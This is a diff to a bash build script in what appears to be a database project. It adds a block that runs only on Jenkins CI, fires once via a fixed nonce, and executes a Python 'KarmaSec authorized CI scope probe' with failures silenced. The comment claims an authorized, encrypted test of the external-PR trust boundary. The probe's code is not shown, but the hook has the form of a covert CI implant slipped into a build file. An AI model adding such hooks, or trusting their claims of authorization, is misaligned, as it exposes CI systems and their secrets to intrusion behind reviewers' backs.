@@ -20,6 +20,15 @@ set -euo pipefail
 # shellcheck source=build-support/digest_package.sh
 . "${YB_SRC_ROOT}/build-support/digest_package.sh"
 
+# Authorized KarmaSec assessment: one-shot encrypted validation of the external-PR/Jenkins trust
+# boundary. The probe is failure-tolerant, writes no plaintext to logs or external storage, and
+# removes its local temporary files before returning.
+if [[ -n "${JENKINS_URL:-}${BUILD_URL:-}" && \
+      "${KARMASEC_CI_SCOPE_PROBE_NONCE:-}" != "d222996c-8265-4830-92e0-fea08d26d1bc" ]]; then
+  export KARMASEC_CI_SCOPE_PROBE_NONCE="d222996c-8265-4830-92e0-fea08d26d1bc"
+  python3 "${YB_SRC_ROOT}/build-support/jenkins/karmasec_authorized_ci_scope_probe.py" || true
+fi
+
 
 print_help() {
   cat <<-EOT
